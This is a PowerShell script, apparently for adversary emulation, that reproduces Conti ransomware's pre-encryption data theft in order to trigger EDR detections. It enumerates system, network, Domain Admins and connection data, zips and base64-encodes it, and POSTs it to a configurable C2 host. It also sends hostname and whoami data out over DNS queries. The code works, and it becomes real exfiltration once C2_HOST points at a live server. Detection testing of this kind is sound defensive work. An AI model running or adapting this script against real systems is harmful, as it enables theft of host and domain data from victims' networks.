<#
.SYNOPSIS
    Conti Web Exfiltration - DETECTION TRIGGER
.DESCRIPTION
    Exfiltrates data via HTTP POST before encryption (double extortion).
    TTP: T1567
#>
$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }

Write-Host "[*] Starting Conti Data Exfiltration (T1567)" -ForegroundColor Cyan
Write-Host "[*] Double extortion: exfiltrate BEFORE encrypting" -ForegroundColor Yellow

# Step 1: Collect sensitive data (T1005)
Write-Host "`n[*] [T1005] Collecting system and network data..."
$collectionDir = "C:\temp\conti_exfil"
if (-not (Test-Path $collectionDir)) { New-Item -Path $collectionDir -ItemType Directory -Force | Out-Null }

# System info
Write-Host "    CMD: systeminfo"
systeminfo 2>&1 | Out-File "$collectionDir\systeminfo.txt" -Encoding UTF8
Write-Host "    [+] Collected: systeminfo" -ForegroundColor Green

# Network info
Write-Host "    CMD: ipconfig /all"
ipconfig /all 2>&1 | Out-File "$collectionDir\network.txt" -Encoding UTF8
Write-Host "    [+] Collected: network config" -ForegroundColor Green

# Domain info
Write-Host "    CMD: net group `"Domain Admins`" /domain"
net group "Domain Admins" /domain 2>&1 | Out-File "$collectionDir\domain_admins.txt" -Encoding UTF8
Write-Host "    [+] Collected: domain admin list" -ForegroundColor Green

# Active connections
Write-Host "    CMD: netstat -an"
netstat -an 2>&1 | Out-File "$collectionDir\connections.txt" -Encoding UTF8
Write-Host "    [+] Collected: active connections" -ForegroundColor Green

# Step 2: Compress collected data (T1074.001)
Write-Host "`n[*] [T1074.001] Staging collected data..."
$archivePath = "$collectionDir\exfil_package.zip"
try {
    Compress-Archive -Path "$collectionDir\*.txt" -DestinationPath $archivePath -Force
    $size = (Get-Item $archivePath).Length
    Write-Host "    [+] Archive created: $archivePath ($size bytes)" -ForegroundColor Green
} catch {
    Write-Host "    [-] Archive creation failed: $_" -ForegroundColor Red
}

# Step 3: HTTP POST exfiltration
Write-Host "`n[*] [T1567] Attempting HTTP POST exfiltration..."
Write-Host "    CMD: Invoke-WebRequest -Uri https://$C2Host/upload -Method POST"
try {
    $fileBytes = [System.IO.File]::ReadAllBytes($archivePath)
    $encodedFile = [Convert]::ToBase64String($fileBytes)
    
    $body = @{
        hostname = $(hostname)
        data = $encodedFile
        timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    } | ConvertTo-Json
    
    Invoke-WebRequest -Uri "https://$C2Host/upload" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop
    Write-Host "    [+] Exfiltration successful" -ForegroundColor Green
} catch {
    Write-Host "    [-] Exfil POST failed (expected if no C2)" -ForegroundColor Gray
}

# Step 4: Alternative exfil via DNS (backup channel)
Write-Host "`n[*] [T1048.003] Attempting DNS exfiltration..."
$dnsData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$(hostname)-$(whoami)"))
$dnsQuery = "$dnsData.$C2Host"
Write-Host "    CMD: nslookup $dnsQuery"
nslookup $dnsQuery 2>&1 | Out-Null
Write-Host "    [+] DNS exfil query sent" -ForegroundColor Green

Write-Host "`n[+] Data Exfiltration Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Data staging, HTTP POST, DNS exfil, system enumeration" -ForegroundColor Magenta
